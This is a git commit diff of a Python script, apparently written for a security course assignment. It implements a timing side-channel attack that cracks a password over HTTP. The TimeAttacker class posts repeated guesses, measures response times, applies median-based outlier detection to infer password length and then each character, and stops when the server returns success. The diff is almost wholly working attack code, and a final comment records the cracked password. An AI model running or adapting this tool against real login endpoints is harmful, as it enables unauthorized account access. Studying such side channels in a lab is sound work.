444267acb5dcffc98247948f745534504fb0ffcf
Austin Hunt <huntaj@cofc.edu>
2022-10-27 21:11:03 -0400

    clean up repo

--- main.py
+++ main.py
@@ -1,125 +1,105 @@
 import requests   
-import json 
-from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor, wait, ALL_COMPLETED 
-from multiprocessing import Value
-from ctypes import c_bool, c_float, c_wchar_p
-from string import ascii_lowercase, digits 
+import json  
+from string import digits, ascii_letters 
+from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor, wait, ALL_COMPLETED
+import numpy as np 
 import sys
 
-current_max_time = None 
-character_cracked = None 
-password_cracked = None 
-last_cracked_character = None 
 
 class TimeAttacker:
     def __init__(self, attack_params):
         self.host = attack_params['url']
+        if 'already_known' in attack_params:
+            self.known = attack_params['already_known']
+        else:
+            self.known = ''
         self.alphabet = attack_params['alphabet']
         self.max_password_length = attack_params['max_password_length']
         self.min_password_length = attack_params['min_password_length']
         self.correct_first_substrings_by_len = {}
-        self.password_cracked = False   
+        self.password_cracked = False 
+        self.current_max_time = 0 
+        self.last_cracked_character = None 
+        self.character_cracked = False   
 
-    def set_global(self, character_cracked_init_arg, current_max_time_init_arg, password_cracked_init_arg, last_cracked_character_init_arg):
-        global character_cracked, current_max_time, password_cracked, last_cracked_character
-        character_cracked = character_cracked_init_arg
-        current_max_time = current_max_time_init_arg
-        password_cracked = password_cracked_init_arg
-        last_cracked_character = last_cracked_character_init_arg
-
-    def guess_password_repeated(self, pwd, repeat=50):  
-        global character_cracked, current_max_time, password_cracked, last_cracked_character
-        if (not character_cracked or not password_cracked) or (not character_cracked.value and not password_cracked.value):
-            total_time = 0  
-            print(f'Guessing password "{pwd}" of len {len(pwd)} - {repeat} times -- avg_time=', end='')
-            # threading makes the timing way too wonky. very inaccurate results
-            with ThreadPoolExecutor(max_workers=2) as executor:
+    def extract_most_significant_outlier(self, arr, m=6.):
+        data = np.array(arr)
+        d = np.abs(data - np.median(data))
+        mdev = np.median(d)
+        s = d / (mdev if mdev else 1.)
+        return data[s > m].tolist()  
+ 
+    def guess_password_repeated(self, pwd, repeat=25):
+        total_time = 0 
+        if not self.character_cracked and not self.password_cracked:
+            print(f'Guessing password "{pwd}" of len {len(pwd)} - {repeat} times')
+            with ProcessPoolExecutor() as executor:
                 futures = [executor.submit(self.guess_password, pwd) for _ in range(repeat)]
-            for f in wait(futures, return_when=ALL_COMPLETED).done:
-                total_time += f.result()  
-            avg_time = total_time / repeat  
-            print(f'{avg_time} microsec')  
-            if current_max_time.value > 0 and (avg_time > (current_max_time.value + 30000) or (avg_time < (current_max_time.value - 30000))): # significantly higher or lower
-                character_cracked.value = True    
-                try:
-                    last_cracked_character.value = pwd[pwd.index('-')-1]
-                except ValueError:
-                    last_cracked_character.value = pwd[-1] 
-            if avg_time > current_max_time.value:
-                current_max_time.value = avg_time
-            return avg_time
+                for f in wait(futures, return_when=ALL_COMPLETED).done:
+                    total_time += f.result()
+            return total_time
         else:
-            print(f'Skipping, last character cracked ({last_cracked_character.value})')
+            print(f'Skipping, last character cracked ({self.last_cracked_character})')
             return 0
 
-    def guess_password(self, pwd):  
-        global password_cracked
-        d = {'pwd': pwd}   
-        response = requests.post(url=self.host, data=json.dumps(d))    
-        response_time = response.elapsed.microseconds
-        if response.status_code == 200:
-            print(f'Correct password found: {pwd}')
-            password_cracked = True 
-            sys.exit(0)
-        return response_time 
-
-    def get_next_letter(self, already_cracked, padding_length): 
-        print(f'get_next_letter({already_cracked}, {padding_length})')
-        # response_times_by_character = {k: 0 for k in self.alphabet} 
-        character_cracked = Value(c_bool, False, lock=True)
-        current_max_time = Value(c_float, 0.0, lock=True)
-        password_cracked = Value(c_bool, False, lock=True)
-        last_cracked_character = Value(c_wchar_p, '', lock=True) 
-        with ProcessPoolExecutor(max_workers=6, initializer=self.set_global, 
-            initargs=(character_cracked, current_max_time, password_cracked, last_cracked_character,)) as executor: 
-            futures = {executor.submit(
-                self.guess_password_repeated, 
-                already_cracked + char + '-' * padding_length): char for char in self.alphabet}
-            wait(futures, return_when=ALL_COMPLETED)
-            # for future in wait(futures, return_when=ALL_COMPLETED).done: 
-            #     char = futures[future]
-            #     response_time = future.result() 
-            #     response_times_by_character[char] += response_time  
-        #_sorted = sorted(response_times_by_character, key=response_times_by_character.get, reverse=True)
-        #print(f'_sorted = {_sorted}')
-        #return _sorted[0]
-        print(f'last cracked = {last_cracked_character.value}')
-        return str(last_cracked_character.value)
+    def guess_password(self, pwd): 
+        if not self.password_cracked: 
+            d = {'pwd': pwd}   
+            response = requests.post(url=self.host, data=json.dumps(d))    
+            response_time = response.elapsed.microseconds   
+            if response.status_code == 200:
+                self.password_cracked = True
+                print(response.content)
+                print(f'Correct password found!: {pwd}')
+                sys.exit(0) 
+            return response_time 
+        return None 
 
     def get_correct_length(self):
         """ use nothing but padding for the password request at varying lengths within expected bounds
         maximum average response time indicates correct length """ 
         print(f'Getting correct length...')
-        times = {}
-        character_cracked = Value(c_bool, False, lock=True)
-        current_max_time = Value(c_float, 0.0, lock=True)
-        password_cracked = Value(c_bool, False, lock=True)
-        last_cracked_character = Value(c_wchar_p, '', lock=True) 
-        with ProcessPoolExecutor(max_workers=6, initializer=self.set_global, initargs=(character_cracked, current_max_time, password_cracked, last_cracked_character)) as executor: 
+        times = {} 
+        with ProcessPoolExecutor() as executor: 
             futures = {executor.submit(
                 self.guess_password_repeated, "-" * length ): length for length in range(self.min_password_length, self.max_password_length + 1)}
             for future in wait(futures, return_when=ALL_COMPLETED).done: 
                 length = futures[future]
                 response_time = future.result() 
                 times[length] = response_time 
-        _sorted = sorted(times, key=times.get, reverse=True)
-        print(f'_sorted = {_sorted}')
+        _sorted = sorted(times, key=times.get, reverse=True) 
         return _sorted[0]
 
-    def attack(self): 
-        correct_length = self.get_correct_length()
-        print(f'Correct length appears to be {correct_length}. Guessing passwords of this length.')  
-        padding_length = correct_length - 1
-        cracked_letters = ''
-        for _ in range(padding_length): 
+    def get_next_letter(self, already_cracked, padding_length): 
+        print(f'get_next_letter({already_cracked}, {padding_length})') 
+        times = {}
+        for char in self.alphabet:
+            response_time = self.guess_password_repeated(already_cracked + char + '-' * padding_length)
+            times[response_time] = char
+            outliers = self.extract_most_significant_outlier(list(times.keys()), m=20)
+            print(f'Times = {times}')
+            print(f'Outliers = {outliers}') 
+            if len(outliers) == 0:
+                continue 
+            else: 
+                return times[outliers[0]] 
+
+    def attack(self):
+        pwd_len = self.get_correct_length() 
+        print(f'Testing with password length {pwd_len}') 
+        cracked_letters = self.known
+        if len(cracked_letters) == pwd_len:
+            self.guess_password(cracked_letters)
+        else: 
+            padding_length = pwd_len - 1 - len(cracked_letters)
+            for _ in range(padding_length): 
+                cracked_letters += self.get_next_letter(
+                    already_cracked=cracked_letters, 
+                    padding_length=padding_length)
+                padding_length -= 1 
             cracked_letters += self.get_next_letter(
-                already_cracked=cracked_letters, 
-                padding_length=padding_length)
-            padding_length -= 1 
-        cracked_letters += self.get_next_letter(
-                already_cracked=cracked_letters, 
-                padding_length=0)
-        print(cracked_letters) 
+                    already_cracked=cracked_letters, 
+                    padding_length=0)  
 
 if __name__ == "__main__": 
         
@@ -129,15 +109,18 @@ if __name__ == "__main__":
         'demo': {
             'url': DEMO_HOST,
             'max_password_length': 12,
-            'min_password_length': 11,
-            'alphabet': digits + ascii_lowercase
+            'min_password_length': 12,
+            'alphabet': digits + ascii_letters
         },
         'assignment': {
             'url': REAL_HOST,
             'max_password_length': 13,
             'min_password_length': 11,
-            'alphabet': digits  
+            'alphabet': digits, 
+            'already_known': '5558675309555'
         }
     }
-    demo_attacker = TimeAttacker(attack_params=attack_params['demo'])   
+    demo_attacker = TimeAttacker(attack_params=attack_params['assignment'])  
     demo_attacker.attack() 
+
+    # CORRECT PASSWORD FOUND! 5558675309555
